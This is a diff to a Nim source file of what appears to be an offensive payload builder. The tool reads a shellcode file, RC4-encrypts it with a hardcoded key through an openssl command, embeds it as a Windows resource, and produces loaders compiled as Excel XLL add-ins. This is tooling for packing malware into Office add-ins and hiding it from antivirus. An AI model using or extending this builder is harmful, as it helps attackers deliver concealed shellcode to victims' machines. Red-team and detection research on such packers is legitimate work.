@@ -55,6 +55,11 @@ let
     compileXll64: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=amd64 -d:strip -d:release -o=simplexll.xll temp_simplexll.nim"
     compileXll32: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=i386 -d:strip -d:release -o=simplexll.xll temp_simplexll.nim"
 
+
+var xxdKey: string = execCmdEx("echo -n 'testKeytestKeyte' | xxd -p").output
+xxdKey.stripLineEnd
+let opensslCmd: string = "/usr/bin/openssl enc -rc4 -in $1 -K $2 -nosalt -out encContent.bin" % [shellcodeFilePath, xxdKey]
+    
 proc aesEncrypt(): void = 
     
     ## Nim's way API using openArray[byte].
@@ -86,24 +91,39 @@ proc aesEncrypt(): void =
 
 proc rc4Encrypt(): void =
     # RC4 Encrypt shellcode to file
-    echo "[Info] Encrypting shellcode with RC4!"
-    var rc4Shellcode = toRC4("testKey", shellcode)
-    scArray = rc4Shellcode.toByteSeq
-    encSC = newSeq[byte](len(scArray))
+    echo "[Status] Encrypting shellcode with RC4!"
+    
+    #var rc4Shellcode = toRC4("testKey", shellcode)
+    #scArray = rc4Shellcode.toByteSeq
+    #encSC = newSeq[byte](len(scArray))
+    #encSC = utils.fromHex(rc4Shellcode)
 
-    echo "[Info] Writing encrypted shellcode to file!"
+    echo "[Status] Writing encrypted shellcode to file!"
     try:
-        writeFile("encContent.bin", encSC)
-        stdout.styledWriteLine(fgGreen, "[Success] Encrypted shellcode file created!")
+        #writeFile("encContent.bin", encSC)
+        #Alternate for encrypting shellcode
+        echo opensslCmd
+        let opensslResult = execCmdEx(opensslCmd)
+        if opensslResult.exitCode == 0:
+            stdout.styledWriteLine(fgGreen, "[Success] Encrypted shellcode file created!")
+            echo xxdKey
+            echo opensslResult.output
+        else:
+            stdout.styledWriteLine(fgRed, "[Failure] Could not create encrypted shellcode file!")
+            echo opensslResult.output
+            quit(1)
         #echo "[Success] Encrypted shellcode file created!"
     except IOError:
         stdout.styledWriteLine(fgRed, "[Failure] Could not create file!")
         #echo "[Failure] Could not create file!"
         quit(1)
+    except:
+        stdout.styledWriteLine(fgRed, "[Failure] File could not be created!")
+        quit(1)
 
     # Create resource file
     try:
-        writeFile("resource.rc", "3 RCDATA \"encContent.bin\"")
+        writeFile("resource.rc", "100 RCDATA \"encContent.bin\"")
         stdout.styledWriteLine(fgGreen, "[Success] Resource file created!")
         #echo "[Success] Resource file created!"
     except IOError:
@@ -114,8 +134,8 @@ proc rc4Encrypt(): void =
     # Compile resource file
     let rcCompileResults = execCmdEx("/usr/bin/x86_64-w64-mingw32-windres resource.rc -o resource.o")
     if rcCompileResults.exitCode == 0:
-        stdout.styledWriteLine(fgGreen, "[Success] Resource file compiled into object!")
-        removeFile("resource.rc")
+        stdout.styledWriteLine(fgGreen, "[Success] Resource file compiled into object file!")
+        #removeFile("resource.rc")
         #echo "[Success] Resource file compiled into object!"
     else:
         stdout.styledWriteLine(fgRed, "[Failure] Could not compile resource file!")
@@ -130,12 +150,13 @@ proc generatePayload(): void =
         compileCmd: string
     # Read raw shellcode file
     try:
+        echo "[Status] Parsing shellcode file!"
         shellcode = readFile(shellcodeFilePath)
         #echo "shellcode = ", toHex(shellcode)
     except IOError:
-        echo "[Failure] Error: Could not open file!"
+        stdout.styledWriteLine(fgRed, "[Failure] Could not open shellcode file!")
         quit(1)
-    echo "[Info] Generating Payload! Be patient."
+    echo "[Status] Generating Payload! Be patient."
     # Encode/Encrypt bytes
     #aesencrypt()
     rc4Encrypt()
@@ -179,7 +200,7 @@ proc generatePayload(): void =
     
     let replacement = testVar
     try:
-        echo "[Info] Encrypting shellcode using AES-256 CTR!"
+        echo "[Status] Encrypting shellcode using AES-256 CTR!"
         templateFile = templateFile.replace(placeholder, replacement)
         tempFile.writeFile(templateFile)
     except:
@@ -187,7 +208,7 @@ proc generatePayload(): void =
         quit(1)
     let origPass = "BLANK_PASSWORD"
     try:
-        echo "[Info] Adding AES key to template file!"
+        echo "[Status] Adding AES key to template file!"
         templateFile = templateFile.replace(origPass, aesPasswd)
         tempFile.writeFile(templateFile)
     except:
@@ -195,7 +216,7 @@ proc generatePayload(): void =
         quit(1)
     let origIV = "BLANK_IV"
     try:
-        echo "[Info] Adding AES IV to template file!"
+        echo "[Status] Adding AES IV to template file!"
         templateFile = templateFile.replace(origIV, toHex(iv))
         tempFile.writeFile(templateFile)
     except:
@@ -203,12 +224,19 @@ proc generatePayload(): void =
         quit(1)
     ]#
     #[
-        echo "[Info] Compiling in progress!\n"
+        echo "[Status] Compiling!\n"
     let compileResults = execCmdEx(compileCmd)
     #tempFile.removeFile
     if verbosity == "verbose":
        echo compileResults.output
     ]#
+
+    echo "[Status] Creating loader file!"
+    try:
+        tempFile.writeFile(templateFile)
+        stdout.styledWriteLine(fgGreen, "[Success] Loader file created!")
+    except IOError:
+        stdout.styledWriteLine(fgRed, "[Failure] Could not create loader file!")
 
 when isMainModule:
     if pCount >= 2:
